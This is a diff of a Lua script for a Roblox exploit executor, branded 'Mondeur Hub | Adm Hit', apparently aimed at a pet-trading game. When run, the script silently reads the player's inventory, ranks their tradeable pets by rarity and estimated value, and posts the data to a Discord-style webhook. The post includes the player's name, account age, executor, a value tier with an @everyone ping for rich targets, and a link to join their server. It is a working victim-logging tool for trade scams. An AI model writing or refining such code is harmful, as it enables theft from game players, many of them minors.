@@ -1,4 +1,4 @@
---// MONDEUR HUB | ADM HIT 🦊 (MASTERPIECE - 0 ERRORS)
+--// MONDEUR HUB | ADM HIT 🦊 (ULTIMATE PERFECT - QUALITY FIRST)
 
 local HttpService = game:GetService("HttpService")
 local ClientData = require(game:GetService("ReplicatedStorage"):WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
@@ -8,39 +8,50 @@ local request = (syn and syn.request) or (http and http.request) or http_request
 
 if not request then return end
 
-local LOW_THRESHOLD = 300
-local HIGH_THRESHOLD = 1500
 local rarityPriority = {legendary=5, ultra_rare=4, rare=3, uncommon=2, common=1}
 local rarityColors = {legendary=0xFFD700, ultra_rare=0xA020F0, rare=0x1E90FF, uncommon=0x32CD32, common=0xB0B0B0}
 
 -- =========================
--- MASTER CLEAN PET NAME
+-- PERFECT NAME EXTRACTION
 -- =========================
-local function cleanPetName(id)
+local function getPerfectName(id)
     if not id then return nil end
+    
     local name = tostring(id):lower():gsub("_", " ")
     
-    -- BLOCK UNTRADEABLE
+    -- UNTRADEABLE BLOCK
     local blocks = {"egg", "jerboa", "starter", "practice", "minigame"}
-    for _, block in ipairs(blocks) do
-        if name:find(block) then return nil end
+    for _, b in ipairs(blocks) do
+        if name:find(b) then return nil end
     end
     
-    -- CLEAN & FORMAT
-    name = name:gsub("%d", ""):gsub("%s+", " "):gsub("^%s+",""):gsub("%s+$","")
+    -- PERFECT CLEANING - KEEP COUNTRY NAMES
+    name = name:gsub("^basic%s+", "") -- Remove "basic "
+    name = name:gsub("^halloween%s+", "") 
+    name = name:gsub("^christmas%s+", "")
+    name = name:gsub("%d", "") -- Numbers only
+    name = name:gsub("^%s*(.-)%s*$", "%1") -- Trim
+    
+    -- FIX SPECIFIC NAMES
+    name = name:gsub("kelpie", "Australian Kelpie")
+    name = name:gsub("shiba", "Shiba Inu")
+    name = name:gsub("spider crab", "Spider Crab")
+    name = name:gsub("leopard cat", "Leopard Cat")
+    
     return name:sub(1,1):upper() .. name:sub(2)
 end
 
 -- =========================
--- EMOJI MASTER
+-- EMOJIS
 -- =========================
 local function getEmoji(name, pet)
-    local e = ""
     local n = name:lower()
+    local e = ""
     if n:find("fox") then e = "🦊"
     elseif n:find("bee") then e = "🐝"
-    elseif n:find("dog") then e = "🐕"
+    elseif n:find("dog") or n:find("kelpie") or n:find("shiba") then e = "🐕"
     elseif n:find("cat") then e = "🐱"
+    elseif n:find("crab") then e = "🦀"
     end
     
     if pet.mega then e = e .. "🌈" end
@@ -52,7 +63,7 @@ local function getEmoji(name, pet)
 end
 
 -- =========================
--- PET PROCESSOR (FLAWLESS)
+-- QUALITY SORTING (RARITY > COUNT)
 -- =========================
 local function processPets(rawPets)
     local pets = {}
@@ -60,12 +71,11 @@ local function processPets(rawPets)
     
     for _, pet in pairs(rawPets or {}) do
         if pet and pet.id then
-            local cleanName = cleanPetName(pet.id)
+            local cleanName = getPerfectName(pet.id)
             if not cleanName then continue end
             
-            local key = cleanName
-            if not pets[key] then
-                pets[key] = {
+            if not pets[cleanName] then
+                pets[cleanName] = {
                     name = cleanName,
                     count = 0,
                     rarity = (pet.rarity or "common"):lower(),
@@ -76,7 +86,7 @@ local function processPets(rawPets)
                 }
             end
             
-            pets[key].count = pets[key].count + 1
+            pets[cleanName].count = pets[cleanName].count + 1
             total = total + 10
         end
     end
@@ -86,12 +96,11 @@ local function processPets(rawPets)
         table.insert(list, data)
     end
     
-    -- FLAWLESS SORTING
+    -- QUALITY FIRST: RARITY PRIORITY (Metal Ox #1!)
     table.sort(list, function(a, b)
-        local aP = rarityPriority[a.rarity] or 1
-        local bP = rarityPriority[b.rarity] or 1
-        if aP ~= bP then return aP > bP end
-        return a.count > b.count
+        local aPrio = rarityPriority[a.rarity] or 1
+        local bPrio = rarityPriority[b.rarity] or 1
+        return aPrio > bPrio or (aPrio == bPrio and a.count > b.count)
     end)
     
     return list, total
@@ -102,7 +111,7 @@ end
 -- =========================
 local function formatList(pets)
     local lines = {}
-    for i = 1, math.min(12, #pets) do
+    for i = 1, math.min(#pets, 12) do
         local p = pets[i]
         lines[i] = getEmoji(p.name, p) .. " " .. p.name .. " x" .. p.count
     end
@@ -110,37 +119,35 @@ local function formatList(pets)
 end
 
 -- =========================
--- WEBHOOK SENDER (MASTER)
+-- SEND WEBHOOK
 -- =========================
 local function send()
     local success, inventory = pcall(function() return ClientData.get("inventory") end)
-    if not success or not inventory then return end
+    local petsRaw = success and inventory and inventory.pets or {}
     
-    local petsRaw = inventory.pets or {}
     local petList, total = processPets(petsRaw)
     
     local best = petList[1]
-    local bestName = best and best.name .. " x" .. best.count or "None"
+    local bestName = best and (best.name .. " x" .. best.count) or "None"
     local bestRarity = best and best.rarity or "common"
     
-    local tier = total >= HIGH_THRESHOLD and "🔴 HIGH" or total >= LOW_THRESHOLD and "🟡 MID" or "🟢 LOW"
+    local tier = total >= 1500 and "🔴 HIGH" or total >= 300 and "🟡 MID" or "🟢 LOW"
     local content = tier == "🔴 HIGH" and "@everyone" or ""
     local color = rarityColors[bestRarity] or 0x2F3136
     
     local embed = {
         title = "🦊 Mondeur Hub | Adm Hit",
-        description = "```" ..
-            "👤 " .. game.Players.LocalPlayer.DisplayName .. "\n"..
-            "🆔 " .. game.Players.LocalPlayer.Name .. "\n"..
-            "📅 " .. game.Players.LocalPlayer.AccountAge .. " days\n"..
-            "📱 " .. (identifyexecutor and identifyexecutor() or "Unknown") .. "\n"..
-            "👥 " .. #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers .. "\n"..
-            "💰 " .. total .. "\n"..
-            "📊 " .. tier .. "```",
+        description = "```👤 "..game.Players.LocalPlayer.DisplayName..
+        "\n🆔 "..game.Players.LocalPlayer.Name..
+        "\n📅 "..game.Players.LocalPlayer.AccountAge.." days"..
+        "\n📱 "..(identifyexecutor and identifyexecutor() or "Unknown")..
+        "\n👥 "..#game.Players:GetPlayers().."/"..game.Players.MaxPlayers..
+        "\n💰 "..total..
+        "\n📊 "..tier.."```",
         fields = {
             {name="🏆 Best Pet", value="```"..bestName.."```"},
-            {name="🐶 Pets", value="```"..formatList(petList).."```"},
-            {name="🌐 Server", value="[Join](".."https://www.roblox.com/games/start?placeId="..game.PlaceId.."&instanceId="..game.JobId..")"}
+            {name="🐶 Pets (Quality→Qty)", value="```"..formatList(petList).."```"},
+            {name="🌐 Server", value="[Join](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&instanceId="..game.JobId..")"}
         },
         color = color,
         footer = {text="Mondeuronbotton"}
@@ -148,14 +155,11 @@ local function send()
     
     pcall(function()
         request({
-            Url = WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"]="application/json"},
-            Body = HttpService:JSONEncode({content=content, embeds={embed}})
+            Url = WEBHOOK, Method="POST",
+            Headers={["Content-Type"]="application/json"},
+            Body=HttpService:JSONEncode({content=content, embeds={embed}})
         })
     end)
-    
-    print("✅ Sent -", #petList, "tradeable pets")
 end
 
 send()
